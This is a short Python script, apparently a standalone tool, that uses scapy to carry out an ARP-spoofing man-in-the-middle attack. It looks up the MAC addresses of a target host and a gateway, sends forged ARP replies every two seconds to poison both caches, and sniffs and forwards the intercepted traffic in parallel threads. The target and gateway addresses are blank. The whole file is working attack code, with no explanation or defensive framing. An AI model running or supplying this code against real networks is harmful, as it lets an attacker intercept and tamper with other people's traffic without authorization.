from time import sleep
import scapy.all as scapy
import threading

gateway = ""
target_ip = ""


def get_mac(ip):
    ans, _ = scapy.srp(scapy.Ether(dst='ff:ff:ff:ff:ff:ff') /
                       scapy.ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
    else:
        raise ValueError("unable to to find mac address")


target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway)

mac_dic = {target_mac: gateway_mac, gateway_mac: target_mac}


def forward(packet):
    packet[scapy.Ether].dst = mac_dic.get(packet[scapy.Ether].src)
    scapy.sendp(packet, verbose=0)


def arp():
    while True:
        scapy.send(scapy.ARP(op='is-at', psrc=gateway,
                             pdst=target_ip, hwdst=target_mac), verbose=0)
        scapy.send(scapy.ARP(op='is-at', psrc=target_ip,
                             pdst=gateway, hwdst=gateway_mac), verbose=0)
        sleep(2)


def sniff_thread():
    scapy.sniff(
        filter=f"ip and (ether src {target_mac} or ether src {gateway_mac})", prn=forward)


threading.Thread(target=arp).start()
threading.Thread(target=sniff_thread).start()
